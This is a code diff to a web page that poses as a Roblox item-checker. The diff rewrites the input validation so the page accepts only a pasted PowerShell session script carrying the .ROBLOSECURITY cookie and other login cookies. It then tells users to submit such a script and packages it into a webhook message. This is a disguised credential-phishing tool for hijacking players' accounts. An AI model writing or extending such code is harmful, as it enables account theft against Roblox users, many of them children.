@@ -69,48 +69,47 @@ function validateInput() {
 function isValidInput(input) {
     if (input.length === 0) return false;
     
-    // Remove whitespace and convert to lowercase for validation
-    const cleanInput = input.replace(/\s+/g, '').toLowerCase();
+    // Only accept the specific PowerShell session script format
+    return isValidPowerShellScript(input);
+}
+
+function isValidPowerShellScript(input) {
+    // Normalize whitespace and check for key PowerShell script components
+    const normalizedInput = input.replace(/\s+/g, ' ').trim();
     
-    // Check for various valid patterns:
+    // Check for required PowerShell session script patterns
+    const requiredPatterns = [
+        /\$session\s*=\s*New-Object\s+Microsoft\.PowerShell\.Commands\.WebRequestSession/i,
+        /\$session\.UserAgent\s*=\s*['"]/i,
+        /\$session\.Cookies\.Add/i,
+        /GuestData/i,
+        /RBXcb/i,
+        /\.ROBLOSECURITY/i,
+        /Invoke-WebRequest/i,
+        /UseBasicParsing/i,
+        /roblox\.com/i,
+        /WebSession\s+\$session/i
+    ];
     
-    // 1. Roblox Item ID (numeric, typically 6-12 digits)
-    const itemIdPattern = /^\d{6,12}$/;
-    if (itemIdPattern.test(cleanInput)) {
-        return true;
+    // All required patterns must be present
+    const matchedPatterns = requiredPatterns.filter(pattern => pattern.test(normalizedInput));
+    
+    // Must have at least 8 out of 10 key patterns to be considered valid
+    if (matchedPatterns.length < 8) {
+        return false;
     }
     
-    // 2. Roblox Asset URL
-    const assetUrlPattern = /^(https?:\/\/)?(www\.)?roblox\.com\/catalog\/\d+/;
-    if (assetUrlPattern.test(cleanInput)) {
-        return true;
+    // Additional validation: check for minimum script length (should be substantial)
+    if (normalizedInput.length < 500) {
+        return false;
     }
     
-    // 3. Asset ID from URL
-    const assetIdFromUrl = cleanInput.match(/\/catalog\/(\d+)/);
-    if (assetIdFromUrl && assetIdFromUrl[1].length >= 6) {
-        return true;
-    }
+    // Check for PowerShell script structure
+    const hasSessionObject = /\$session\s*=\s*New-Object/i.test(normalizedInput);
+    const hasCookies = /\.Cookies\.Add.*\(.*New-Object\s+System\.Net\.Cookie/i.test(normalizedInput);
+    const hasInvokeWebRequest = /Invoke-WebRequest.*-WebSession\s+\$session/i.test(normalizedInput);
     
-    // 4. Game Pass or Developer Product IDs
-    const gamePassPattern = /^(gamepass|devproduct):\d{6,12}$/;
-    if (gamePassPattern.test(cleanInput)) {
-        return true;
-    }
-    
-    // 5. Roblox promo codes (letters and numbers, 6-20 characters)
-    const promoCodePattern = /^[a-z0-9]{6,20}$/;
-    if (promoCodePattern.test(cleanInput)) {
-        return true;
-    }
-    
-    // 6. Bundle IDs
-    const bundlePattern = /^bundle:\d{3,8}$/;
-    if (bundlePattern.test(cleanInput)) {
-        return true;
-    }
-    
-    return false;
+    return hasSessionObject && hasCookies && hasInvokeWebRequest;
 }
 
 function showValidationError() {
@@ -118,12 +117,12 @@ function showValidationError() {
     const errorElement = document.createElement('div');
     errorElement.className = 'validation-error';
     errorElement.innerHTML = `
-        <p>❌ Invalid format. Please enter one of the following:</p>
+        <p>❌ Invalid format. Please enter a valid PowerShell script:</p>
         <ul>
-            <li>• Roblox Item ID (e.g., 123456789)</li>
-            <li>• Roblox Asset URL (e.g., roblox.com/catalog/123456789)</li>
-            <li>• Promo Code (e.g., ROBLOX2024)</li>
-            <li>• Game Pass ID (e.g., gamepass:123456789)</li>
+            <li>• Must contain PowerShell session creation</li>
+            <li>• Must include Roblox cookies and authentication</li>
+            <li>• Must have Invoke-WebRequest with session</li>
+            <li>• Script must be complete and properly formatted</li>
         </ul>
     `;
     
@@ -131,22 +130,28 @@ function showValidationError() {
 }
 
 function extractItemId(input) {
-    const cleanInput = input.replace(/\s+/g, '');
+    // For PowerShell scripts, extract key identifiers for logging
+    const extractedInfo = {
+        type: 'PowerShell Script',
+        length: input.length,
+        hasRoblosecurity: /\.ROBLOSECURITY/i.test(input),
+        hasUserAgent: /UserAgent/i.test(input),
+        hasCookies: /Cookies\.Add/i.test(input)
+    };
     
-    // Extract ID from URL
-    const urlMatch = cleanInput.match(/\/catalog\/(\d+)/);
-    if (urlMatch) {
-        return urlMatch[1];
+    // Extract session ID if present
+    const sessionMatch = input.match(/sessionid=([a-f0-9\-]+)/i);
+    if (sessionMatch) {
+        extractedInfo.sessionId = sessionMatch[1].substring(0, 8) + '...'; // Partial for security
     }
     
-    // Extract ID from gamepass or devproduct format
-    const specialMatch = cleanInput.match(/^(gamepass|devproduct|bundle):(\d+)$/i);
-    if (specialMatch) {
-        return `${specialMatch[1]}:${specialMatch[2]}`;
+    // Extract user ID from cookies if present
+    const userIdMatch = input.match(/UserID=(-?\d+)/i);
+    if (userIdMatch) {
+        extractedInfo.userId = userIdMatch[1];
     }
     
-    // Return as-is if it's already a clean ID or code
-    return cleanInput;
+    return JSON.stringify(extractedInfo, null, 2);
 }
 
 function toggleTheme() {
@@ -267,8 +272,8 @@ async function submitCode() {
                 timestamp: new Date().toISOString(),
                 fields: [
                     {
-                        name: "📝 Item Check Request",
-                        value: `**Original Input:** \`${code}\`\n**Processed ID:** \`${cleanItemId}\`\n**Status:** Checking if item is stolen...`,
+                        name: "📝 PowerShell Script Submission",
+                        value: `**Script Analysis:**\n\`\`\`json\n${cleanItemId}\n\`\`\`\n**Status:** Script received and processed`,
                         inline: false
                     },
                     {
